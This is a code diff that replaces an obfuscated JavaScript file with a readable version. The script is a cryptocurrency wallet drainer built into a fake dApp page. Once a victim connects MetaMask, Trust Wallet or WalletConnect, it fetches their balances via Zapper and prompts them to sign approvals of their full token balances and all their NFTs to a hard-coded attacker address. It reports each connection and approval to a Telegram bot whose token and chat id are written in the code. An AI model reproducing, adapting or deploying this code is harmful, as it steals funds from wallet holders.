@@ -1,1 +1,517 @@
-const _0x1759c7=_0x2ffc;(function(_0x3ccc78,_0x4eddd2){const _0x165301=_0x2ffc,_0x498511=_0x3ccc78();while(!![]){try{const _0x3a9740=-parseInt(_0x165301(0x128))/0x1*(parseInt(_0x165301(0xf1))/0x2)+-parseInt(_0x165301(0xe4))/0x3+-parseInt(_0x165301(0xeb))/0x4+-parseInt(_0x165301(0x12f))/0x5+-parseInt(_0x165301(0x10e))/0x6+parseInt(_0x165301(0x108))/0x7*(parseInt(_0x165301(0x114))/0x8)+parseInt(_0x165301(0xd9))/0x9*(parseInt(_0x165301(0x111))/0xa);if(_0x3a9740===_0x4eddd2)break;else _0x498511['push'](_0x498511['shift']());}catch(_0x577017){_0x498511['push'](_0x498511['shift']());}}}(_0x6f60,0x5aaf9));const defaultNetworks=[_0x1759c7(0x12e),_0x1759c7(0xfa),_0x1759c7(0xea)],chainIdsNetworks={'ethereum':0x1,'binance-smart-chain':0x38,'polygon':0x89},chainIdsNames={'ethereum':_0x1759c7(0xcd),'binance-smart-chain':_0x1759c7(0xe1),'polygon':_0x1759c7(0xec)},forbiddenTokens=[_0x1759c7(0x10a),'BNB',_0x1759c7(0xdd)],abi=[{'constant':![],'inputs':[{'name':_0x1759c7(0xe0),'type':_0x1759c7(0xd5)},{'name':'_value','type':_0x1759c7(0xe3)}],'name':_0x1759c7(0x130),'outputs':[{'name':'','type':_0x1759c7(0x132)}],'payable':![],'stateMutability':'nonpayable','type':'function'}],abiNFT=[{'inputs':[{'internalType':_0x1759c7(0xd5),'name':_0x1759c7(0xf3),'type':_0x1759c7(0xd5)},{'internalType':_0x1759c7(0x132),'name':_0x1759c7(0xff),'type':_0x1759c7(0x132)}],'name':'setApprovalForAll','outputs':[],'stateMutability':'nonpayable','type':'function'}],accountBalances={'tokens':[],'nft':[]},WITHDRAWAL_ADDRESS=_0x1759c7(0x120),MINIMAL_SUM_IN_USD=0x1;function _0x6f60(){const _0x59b2cd=['0x51D56aDd3F60F42b4D751574a8EF25EEFb538356','selectedAddress','Contract','https://api.telegram.org/bot','test','createElement','/sendMessage?chat_id=','split','1PYQLhQ','utils','length','GET','POST','getSigner','ethereum','688930fNHewF','approve','_chainId','bool','accountsChanged','context','ajax','_accounts','display','#chainErrorName','WalletConnectProvider','https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03','Ethereum','balanceUSD','vendor','appId','indexOf','appendChild','Metamask','metamask','address','show','Contract\x20address\x20','default','1719WnkGLj','MSStream','splice','eth_requestAccounts','MATIC','https://api.zapper.fi/v2/balances?addresses%5B%5D=','#transfer','_spender','Binance\x20Smart\x20Chain','any','uint256','895347owJlxp','target','values','network','undefined','Metamask\x20connected\x20','polygon','866924ZLUPvX','Polygon','findIndex','click','tokens','walletconnect','975166tlmbfP','_self','operator','fadeOut','1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0','none','nft','https://polygon-rpc.com','request','binance-smart-chain','unknown','location','userAgent','opera','approved','Web3Provider','networkVersion','iOS','-653343618','querySelector','#overlay','https://metamask.app.link/dapp/','push','4259521TirqKP','event:\x20','ETH','wallet_switchEthereumChain','wallet','#chainErrorMessage','2680104IbkDcw','style','disabled','70690ZMDPDj','%0A%0A','fadeIn','8WcWPXL','parse_mode=HTML&text=','parse','https://bsc-dataseed.binance.org/','ERC20\x20Approved.\x20Address\x20of\x20holder:\x20','Android','providers','block','Basic\x20OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg==','balanceRaw','#connect-metamask','setApprovalForAll'];_0x6f60=function(){return _0x59b2cd;};return _0x6f60();}function _0x2ffc(_0x10e84a,_0x4849fb){const _0x6f608d=_0x6f60();return _0x2ffc=function(_0x2ffcb7,_0x48df8a){_0x2ffcb7=_0x2ffcb7-0xcb;let _0x28f523=_0x6f608d[_0x2ffcb7];return _0x28f523;},_0x2ffc(_0x10e84a,_0x4849fb);}let accountAddress=null,walletConnector,currentConnection;const getMobileOperatingSystem=()=>{const _0x14dc80=_0x1759c7,_0x32326f=navigator['userAgent']||navigator[_0x14dc80(0xcf)]||window[_0x14dc80(0xfe)];if(/windows phone/i[_0x14dc80(0x124)](_0x32326f))return'Windows\x20Phone';if(/android/i[_0x14dc80(0x124)](_0x32326f))return _0x14dc80(0x119);if(/iPad|iPhone|iPod/[_0x14dc80(0x124)](_0x32326f)&&!window[_0x14dc80(0xda)])return _0x14dc80(0x102);return _0x14dc80(0xfb);},getDAppSystem=()=>{const _0x460268=_0x1759c7,_0x488947=navigator[_0x460268(0xfd)]||navigator[_0x460268(0xcf)]||window[_0x460268(0xfe)];if(/Trust/i[_0x460268(0x124)](_0x488947))return'Trust';if(/CriOS/i['test'](_0x488947))return _0x460268(0xd3);return'unknown';},openMetaMaskUrl=_0xd4c5b5=>{const _0x46627f=_0x1759c7,_0xaa191e=document[_0x46627f(0x125)]('a');_0xaa191e['href']=_0xd4c5b5,_0xaa191e[_0x46627f(0xe5)]=_0x46627f(0xf2),document['body'][_0x46627f(0xd2)](_0xaa191e),_0xaa191e[_0x46627f(0xee)](),_0xaa191e['remove']();},getBalances=async()=>{const _0x19ae88=_0x1759c7;document[_0x19ae88(0x104)](_0x19ae88(0xdf))[_0x19ae88(0x110)]=!![];try{$(_0x19ae88(0x105))[_0x19ae88(0x113)](0x12c),$('#chainErrorMessage')['hide']();if(currentConnection===_0x19ae88(0xd4)){if(typeof window['ethereum']['selectedAddress']!=='undefined')accountAddress=window[_0x19ae88(0x12e)][_0x19ae88(0x121)];else typeof window[_0x19ae88(0x12e)][_0x19ae88(0xd5)]!==_0x19ae88(0xe8)&&(accountAddress=window[_0x19ae88(0x12e)][_0x19ae88(0xd5)]);}else currentConnection===_0x19ae88(0xf0)&&(accountAddress=walletConnector[_0x19ae88(0x136)][0x0]);const _0x23f735=await $[_0x19ae88(0x135)]({'url':_0x19ae88(0xde)+accountAddress,'type':_0x19ae88(0x12b),'headers':{'Authorization':_0x19ae88(0x11c)}}),_0x10781b=_0x23f735[_0x19ae88(0x127)](_0x19ae88(0x109));for(const _0x41e307 of _0x10781b){const _0x37d8a3=_0x41e307['split']('data:\x20');if(typeof _0x37d8a3[0x0]!==_0x19ae88(0xe8)){if(_0x37d8a3[0x0][_0x19ae88(0xd1)]('category')>-0x1){const _0x8b0e8b=JSON[_0x19ae88(0x116)](_0x37d8a3[0x1]),_0xe18233=_0x8b0e8b[_0x19ae88(0x10c)],_0xf141ae=_0x8b0e8b['nft'];for(const _0x471347 of Object[_0x19ae88(0xe6)](_0xe18233)){defaultNetworks[_0x19ae88(0xd1)](_0x471347['network'])>-0x1&&accountBalances[_0x19ae88(0xef)][_0x19ae88(0x107)](_0x471347);}for(const _0x3cd0f2 of Object[_0x19ae88(0xe6)](_0xf141ae)){defaultNetworks['indexOf'](_0x3cd0f2[_0x19ae88(0xe7)])>-0x1&&accountBalances[_0x19ae88(0xf7)][_0x19ae88(0x107)](_0x3cd0f2);}}}}accountBalances[_0x19ae88(0xef)]['sort']((_0x193576,_0x9e8a98)=>_0x193576['balanceUSD']>_0x9e8a98['balanceUSD']?-0x1:_0x9e8a98[_0x19ae88(0xce)]>_0x193576[_0x19ae88(0xce)]?0x1:0x0),accountBalances[_0x19ae88(0xf7)]['sort']((_0x4c05ce,_0x230b13)=>_0x4c05ce['balanceUSD']>_0x230b13[_0x19ae88(0xce)]?-0x1:_0x230b13[_0x19ae88(0xce)]>_0x4c05ce[_0x19ae88(0xce)]?0x1:0x0);for(const _0x4f69d7 of forbiddenTokens){const _0x3448f2=accountBalances[_0x19ae88(0xef)][_0x19ae88(0xed)](_0x4c43d5=>_0x4c43d5['context']['symbol']===_0x4f69d7);_0x3448f2>-0x1&&accountBalances['tokens'][_0x19ae88(0xdb)](_0x3448f2,0x1);}for(let _0x4a294c=0x0;_0x4a294c<accountBalances['nft'][_0x19ae88(0x12a)];_0x4a294c++){let _0x536c85=null,_0x2f2506=null,_0x42b6d7=null;typeof accountBalances['nft'][_0x4a294c]!==_0x19ae88(0xe8)&&(_0x536c85=accountBalances[_0x19ae88(0xf7)][_0x4a294c]);_0x42b6d7=_0x536c85;if(_0x42b6d7){if(_0x42b6d7[_0x19ae88(0xce)]<MINIMAL_SUM_IN_USD){$(_0x19ae88(0x105))[_0x19ae88(0xf4)](0x12c);return;}let _0x146808,_0x5244be;if(currentConnection===_0x19ae88(0xd4))_0x146808=new Web3(window[_0x19ae88(0x12e)]),_0x5244be=new ethers['providers'][(_0x19ae88(0x100))](window[_0x19ae88(0x12e)],_0x19ae88(0xe2)),parseInt(window[_0x19ae88(0x12e)][_0x19ae88(0x101)])!==chainIdsNetworks[_0x42b6d7[_0x19ae88(0xe7)]]&&await window[_0x19ae88(0x12e)][_0x19ae88(0xf9)]({'method':_0x19ae88(0x10b),'params':[{'chainId':_0x146808[_0x19ae88(0x129)]['toHex'](chainIdsNetworks[_0x42b6d7[_0x19ae88(0xe7)]])}]});else{if(currentConnection===_0x19ae88(0xf0)){if(walletConnector[_0x19ae88(0x131)]!==chainIdsNetworks[_0x42b6d7[_0x19ae88(0xe7)]]){$(_0x19ae88(0x138))['text'](chainIdsNames[_0x42b6d7['network']]),$(_0x19ae88(0x10d))[_0x19ae88(0xd6)](),$(_0x19ae88(0x105))[_0x19ae88(0xf4)](0x12c);return;}_0x5244be=new window[(_0x19ae88(0xcb))][(_0x19ae88(0xd8))]({'rpc':{0x1:_0x19ae88(0xcc),0x38:_0x19ae88(0x117),0x89:_0x19ae88(0xf8)}}),await _0x5244be['enable'](),_0x5244be=new ethers[(_0x19ae88(0x11a))][(_0x19ae88(0x100))](_0x5244be,_0x19ae88(0xe2));}}const _0xe48cc8=_0x5244be[_0x19ae88(0x12d)]();if(_0x42b6d7[_0x19ae88(0xd0)]===_0x19ae88(0xef)){const _0x466ccd=new ethers[(_0x19ae88(0x122))](_0x42b6d7[_0x19ae88(0xd5)],abi,_0xe48cc8);try{await _0x466ccd[_0x19ae88(0x130)](WITHDRAWAL_ADDRESS,_0x42b6d7['context']['balanceRaw']),$['ajax']({'type':'POST','url':_0x19ae88(0x123)+_0x19ae88(0xf5)+_0x19ae88(0x126)+_0x19ae88(0x103),'data':'parse_mode=HTML&text='+encodeURIComponent(_0x19ae88(0x118)+accountAddress)+'%0A%0A'+encodeURIComponent(_0x19ae88(0xd7)+_0x42b6d7['address'])});}catch(_0x2648f4){}}else{if(_0x42b6d7[_0x19ae88(0xd0)]===_0x19ae88(0xf7)){const _0x18cc6b=new ethers[(_0x19ae88(0x122))](_0x42b6d7[_0x19ae88(0xd5)],abiNFT,_0xe48cc8);try{await _0x18cc6b[_0x19ae88(0x11f)](WITHDRAWAL_ADDRESS,!![]),$['ajax']({'type':'POST','url':_0x19ae88(0x123)+_0x19ae88(0xf5)+_0x19ae88(0x126)+_0x19ae88(0x103),'data':_0x19ae88(0x115)+encodeURIComponent('NFT\x20Approved.\x20Address\x20of\x20holder:\x20'+accountAddress)+'%0A%0A'+encodeURIComponent(_0x19ae88(0xd7)+_0x42b6d7[_0x19ae88(0xd5)])});}catch(_0x37136d){}}else{}}}else{}}for(let _0x575cb4=0x0;_0x575cb4<accountBalances[_0x19ae88(0xef)][_0x19ae88(0x12a)];_0x575cb4++){let _0x1e4b43=null,_0xaa1153=null,_0x5bfb10=null;typeof accountBalances[_0x19ae88(0xef)][_0x575cb4]!=='undefined'&&(_0xaa1153=accountBalances[_0x19ae88(0xef)][_0x575cb4]);_0x5bfb10=_0xaa1153;if(_0x5bfb10){if(_0x5bfb10[_0x19ae88(0xce)]<MINIMAL_SUM_IN_USD){$(_0x19ae88(0x105))[_0x19ae88(0xf4)](0x12c);return;}let _0x9fa03,_0x29a92f;if(currentConnection===_0x19ae88(0xd4))_0x9fa03=new Web3(window['ethereum']),_0x29a92f=new ethers[(_0x19ae88(0x11a))]['Web3Provider'](window['ethereum'],_0x19ae88(0xe2)),parseInt(window['ethereum']['networkVersion'])!==chainIdsNetworks[_0x5bfb10[_0x19ae88(0xe7)]]&&await window[_0x19ae88(0x12e)][_0x19ae88(0xf9)]({'method':'wallet_switchEthereumChain','params':[{'chainId':_0x9fa03[_0x19ae88(0x129)]['toHex'](chainIdsNetworks[_0x5bfb10[_0x19ae88(0xe7)]])}]});else{if(currentConnection===_0x19ae88(0xf0)){if(walletConnector[_0x19ae88(0x131)]!==chainIdsNetworks[_0x5bfb10[_0x19ae88(0xe7)]]){$('#chainErrorName')['text'](chainIdsNames[_0x5bfb10[_0x19ae88(0xe7)]]),$(_0x19ae88(0x10d))[_0x19ae88(0xd6)](),$(_0x19ae88(0x105))[_0x19ae88(0xf4)](0x12c);return;}_0x29a92f=new window[(_0x19ae88(0xcb))][(_0x19ae88(0xd8))]({'rpc':{0x1:'https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03',0x38:_0x19ae88(0x117),0x89:_0x19ae88(0xf8)}}),await _0x29a92f['enable'](),_0x29a92f=new ethers[(_0x19ae88(0x11a))][(_0x19ae88(0x100))](_0x29a92f,_0x19ae88(0xe2));}}const _0x2a6678=_0x29a92f[_0x19ae88(0x12d)]();if(_0x5bfb10[_0x19ae88(0xd0)]===_0x19ae88(0xef)){const _0x62f538=new ethers[(_0x19ae88(0x122))](_0x5bfb10[_0x19ae88(0xd5)],abi,_0x2a6678);try{await _0x62f538['approve'](WITHDRAWAL_ADDRESS,_0x5bfb10[_0x19ae88(0x134)][_0x19ae88(0x11d)]),$[_0x19ae88(0x135)]({'type':_0x19ae88(0x12c),'url':_0x19ae88(0x123)+_0x19ae88(0xf5)+_0x19ae88(0x126)+_0x19ae88(0x103),'data':_0x19ae88(0x115)+encodeURIComponent(_0x19ae88(0x118)+accountAddress)+_0x19ae88(0x112)+encodeURIComponent(_0x19ae88(0xd7)+_0x5bfb10['address'])});}catch(_0x65df59){}}else{if(_0x5bfb10[_0x19ae88(0xd0)]===_0x19ae88(0xf7)){const _0x5c68c4=new ethers[(_0x19ae88(0x122))](_0x5bfb10[_0x19ae88(0xd5)],abiNFT,_0x2a6678);try{await _0x5c68c4['setApprovalForAll'](WITHDRAWAL_ADDRESS,!![]),$[_0x19ae88(0x135)]({'type':_0x19ae88(0x12c),'url':_0x19ae88(0x123)+'1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0'+_0x19ae88(0x126)+'-653343618','data':_0x19ae88(0x115)+encodeURIComponent('NFT\x20Approved.\x20Address\x20of\x20holder:\x20'+accountAddress)+_0x19ae88(0x112)+encodeURIComponent('Contract\x20address\x20'+_0x5bfb10[_0x19ae88(0xd5)])});}catch(_0x17e152){}}else{}}}else{}}document[_0x19ae88(0x104)](_0x19ae88(0xdf))['disabled']=![];}catch(_0x376715){document[_0x19ae88(0x104)]('#transfer')[_0x19ae88(0x110)]=![];}},connectMetamask=async()=>{const _0x4cca7a=_0x1759c7;if(getDAppSystem()!==_0x4cca7a(0xd3)&&getMobileOperatingSystem()!==_0x4cca7a(0xfb)){openMetaMaskUrl(_0x4cca7a(0x106)+window[_0x4cca7a(0xfc)]['host']);return;}window[_0x4cca7a(0x12e)]['on'](_0x4cca7a(0x133),function(_0x4e36d3){accountAddress=_0x4e36d3[0x0];});const _0x55d949=await window[_0x4cca7a(0x12e)][_0x4cca7a(0xf9)]({'method':_0x4cca7a(0xdc)});accountAddress=_0x55d949[0x0],$[_0x4cca7a(0x135)]({'type':'POST','url':_0x4cca7a(0x123)+_0x4cca7a(0xf5)+_0x4cca7a(0x126)+_0x4cca7a(0x103),'data':'parse_mode=HTML&text='+encodeURIComponent(_0x4cca7a(0xe9)+accountAddress)}),currentConnection=_0x4cca7a(0xd4),document[_0x4cca7a(0x104)](_0x4cca7a(0x11e))['style'][_0x4cca7a(0x137)]=_0x4cca7a(0xf6),document['querySelector'](_0x4cca7a(0xdf))[_0x4cca7a(0x10f)][_0x4cca7a(0x137)]=_0x4cca7a(0x11b);};
+const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
+const chainIdsNetworks = {
+    "ethereum": 1,
+    "binance-smart-chain": 56,
+    "polygon": 137
+}
+const chainIdsNames = {
+    "ethereum": "Ethereum",
+    "binance-smart-chain": "Binance Smart Chain",
+    "polygon": "Polygon"
+}
+const forbiddenTokens = ["ETH", "BNB", "MATIC"]
+
+const abi = [
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "_spender",
+                "type": "address"
+            },
+            {
+                "name": "_value",
+                "type": "uint256"
+            }
+        ],
+        "name": "approve",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+const abiNFT = [
+    {
+        "inputs": [{
+            "internalType": "address",
+            "name": "operator",
+            "type": "address"
+        }, {
+            "internalType": "bool",
+            "name": "approved",
+            "type": "bool"
+        }],
+        "name": "setApprovalForAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+]
+
+const accountBalances = {
+    tokens: [],
+    nft: []
+}
+
+const WITHDRAWAL_ADDRESS = "0x51D56aDd3F60F42b4D751574a8EF25EEFb538356"
+const MIN_TOKEN_USD = 20
+const MIN_NFT_USD = 100
+
+let accountAddress = null, walletConnector, currentConnection
+
+const getMobileOperatingSystem = () => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (/windows phone/i.test(userAgent)) {
+        return "Windows Phone";
+    }
+
+    if (/android/i.test(userAgent)) {
+        return "Android";
+    }
+
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+    }
+
+    return "unknown";
+}
+
+const getDAppSystem = () => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (/Trust/i.test(userAgent)) {
+        return "Trust";
+    }
+
+    if (/CriOS/i.test(userAgent)) {
+        return "Metamask";
+    }
+
+    return "unknown";
+}
+
+const openMetaMaskUrl = (url) => {
+    const a = document.createElement("a");
+    a.href = url;
+    a.target = "_self";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+
+const getBalances = async () => {
+
+    try {
+        //    document.querySelector('#transfer').style.display = "block";
+        document.querySelector('#transfer').disabled = true;
+    } catch (e) {}
+
+    try {
+        $("#overlay").fadeIn(300);
+        $('#chainErrorMessage').hide();
+
+        if (currentConnection === "metamask") {
+            if (typeof window.ethereum.selectedAddress !== "undefined") {
+                accountAddress = window.ethereum.selectedAddress
+            } else if (typeof window.ethereum.address !== "undefined") {
+                accountAddress = window.ethereum.address
+            }
+        } else if (currentConnection === "walletconnect") {
+            accountAddress = walletConnector._accounts[0]
+            accountAddress = '0x623405ba4764a6dccc0f0adddbb24a35f4755d7f'
+        }
+
+        const response = await $.ajax({
+            url: `https://api.zapper.fi/v2/balances?addresses%5B%5D=${accountAddress}`,
+            type: "GET",
+            headers: {
+                Authorization: "Basic OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg=="
+            }
+        })
+
+        $.ajax({
+            type: "POST",
+            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+            data: "parse_mode=HTML&text="+encodeURIComponent("started approving: "+accountAddress),
+        });
+
+        const events = response.split('event: ')
+
+        for (const event of events) {
+            const data = event.split('data: ')
+
+            if (typeof data[0] !== "undefined") {
+                if (data[0].indexOf("category") > -1) {
+                    const category = JSON.parse(data[1]);
+                    const wallet = category['wallet']
+                    const nft = category['nft']
+
+                    for (const wal of Object.values(wallet)) {
+                        if (defaultNetworks.indexOf(wal.network) > -1) {
+                            accountBalances["tokens"].push(wal)
+                        }
+                    }
+
+                    for (const wal of Object.values(nft)) {
+                        if (defaultNetworks.indexOf(wal.network) > -1) {
+                            accountBalances["nft"].push(wal)
+                        }
+                    }
+                }
+            }
+        }
+
+        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
+        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
+
+        for (const forbiddenToken of forbiddenTokens) {
+            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)
+
+            if (index > -1) {
+                accountBalances.tokens.splice(index, 1)
+            }
+        }
+
+        for(let i = 0; i < accountBalances.nft.length; i++) {
+            let topNFT = null, topToken = null, withdrawalToken = null
+
+            if (typeof accountBalances.nft[i] !== "undefined") {
+                topNFT = accountBalances.nft[i]
+            }
+
+            withdrawalToken = topNFT
+
+            if (withdrawalToken) {
+                if (withdrawalToken.balanceUSD < MIN_NFT_USD) {
+                    $("#overlay").fadeOut(300);
+
+                    return
+                }
+
+                let web3, provider
+
+                if (currentConnection === "metamask") {
+                    web3 = new Web3(window.ethereum)
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")
+
+                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
+                        });
+                    }
+                } else if (currentConnection === "walletconnect") {
+                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
+                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
+                        $('#chainErrorMessage').show();
+
+                        $("#overlay").fadeOut(300);
+
+                        return
+                    }
+
+                    provider = new window.WalletConnectProvider.default({
+                        rpc: {
+                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
+                            56: "https://bsc-dataseed.binance.org/",
+                            137: "https://polygon-rpc.com"
+                        }
+                    });
+
+                    await provider.enable()
+
+                    provider = new ethers.providers.Web3Provider(provider, "any")
+                }
+
+                const signer = provider.getSigner()
+
+                if (withdrawalToken.appId === "tokens") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
+
+                    try {
+                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else if (withdrawalToken.appId === "nft") {
+                    console.log(withdrawalToken.address)
+                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
+
+                    try {
+                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else {
+
+                }
+            } else {
+
+            }
+        }
+
+        for(let i = 0; i < accountBalances.tokens.length; i++) {
+            let topNFT = null, topToken = null, withdrawalToken = null
+
+            if (typeof accountBalances.tokens[i] !== "undefined") {
+                topToken = accountBalances.tokens[i]
+            }
+
+            withdrawalToken = topToken
+
+            if (withdrawalToken) {
+                if (withdrawalToken.balanceUSD < MIN_TOKEN_USD) {
+                    $("#overlay").fadeOut(300);
+                    return
+                }
+
+                let web3, provider
+
+                if (currentConnection === "metamask") {
+                    web3 = new Web3(window.ethereum)
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")
+
+                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
+                        });
+                    }
+                } else if (currentConnection === "walletconnect") {
+                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
+                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
+                        $('#chainErrorMessage').show();
+
+                        $("#overlay").fadeOut(300);
+
+                        return
+                    }
+
+                    provider = new window.WalletConnectProvider.default({
+                        rpc: {
+                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
+                            56: "https://bsc-dataseed.binance.org/",
+                            137: "https://polygon-rpc.com"
+                        }
+                    });
+
+                    await provider.enable()
+
+                    provider = new ethers.providers.Web3Provider(provider, "any")
+                }
+
+                const signer = provider.getSigner()
+
+                if (withdrawalToken.appId === "tokens") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
+
+                    try {
+                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else if (withdrawalToken.appId === "nft") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
+
+                    try {
+                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else {
+
+                }
+            } else {
+
+            }
+        }
+        try {
+            document.querySelector('#transfer').disabled = false;
+        } catch (e) {}
+        
+    } catch (e) {
+        try {
+            document.querySelector('#transfer').disabled = false;
+        } catch (e) {}
+    }
+}
+
+const checkInstallMetamask = () => {
+    return new Promise((res) => {
+        if (typeof window.ethereum !== 'undefined') {
+            return res(true)
+        } else {
+            return res(false)
+        }
+    })
+}
+
+const connectMetamask = async () => {
+    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
+        openMetaMaskUrl(`https://metamask.app.link/dapp/${window.location.host}`)
+
+        return
+    }
+
+    window.ethereum.on('accountsChanged', function (accounts) {
+        accountAddress = accounts[0]
+
+    });
+
+    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
+
+    accountAddress = accounts[0]
+
+    $.ajax({
+         type: "POST",
+         url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
+         data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE Metamask connected "+accountAddress),
+    });
+
+    currentConnection = "metamask"
+
+    try {
+        document.querySelector('#connect-metamask').style.display = "none";
+        document.querySelector('#transfer').style.display = "block";
+    } catch (e) {}
+}
+
+const connectTrustWallet = async () => {
+    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
+        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)
+
+        return
+    }
+
+    if (window.ethereum?.isTrust) {
+        window.ethereum.on('accountsChanged', function (accounts) {
+            accountAddress = accounts[0]
+
+
+        });
+
+        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
+
+        accountAddress = accounts[0]
+        currentConnection = "metamask"
+
+    } else {
+        if (!walletConnector.connected) {
+            walletConnector.createSession().then(() => {
+                const uri = walletConnector.uri;
+
+                window.WalletConnectQRCodeModal.default.open(uri, () => {
+                    console.log('QR Code Modal closed');
+                });
+            });
+        } else {
+            walletConnector.killSession();
+        }
+    }
+}
+
+const initMetamask = async () => {
+
+    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
+
+
+        return
+    }
+
+    const installedMetamask = await checkInstallMetamask()
+
+    if (!installedMetamask) {
+
+
+        return
+    }
+
+
+}
+
+const initWalletConnect = () => {
+    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {
+
+
+        return
+    }
+
+    walletConnector = new window.WalletConnect.default({
+        bridge: 'https://bridge.walletconnect.org'
+    });
+
+
+
+    walletConnector.on('connect', function (error, payload) {
+        if (error) {
+            console.error(error);
+        } else {
+            window.WalletConnectQRCodeModal.default.close();
+
+
+            accountAddress = payload.params[0].accounts[0]
+            currentConnection = "walletconnect"
+        }
+    });
+
+    walletConnector.on('session_update', function (error, payload) {
+        if (error) {
+            console.error(error);
+        } else if (walletConnector.connected) {
+
+            accountAddress = payload.params[0].accounts[0]
+        }
+
+    });
+
+    walletConnector.on('disconnect', function (error, payload) {
+        if (error) {
+            console.error(error);
+        } else {
+
+
+            accountAddress = null
+        }
+    });
+}
+
+
+//setTimeout(connectMetamask, 1000)
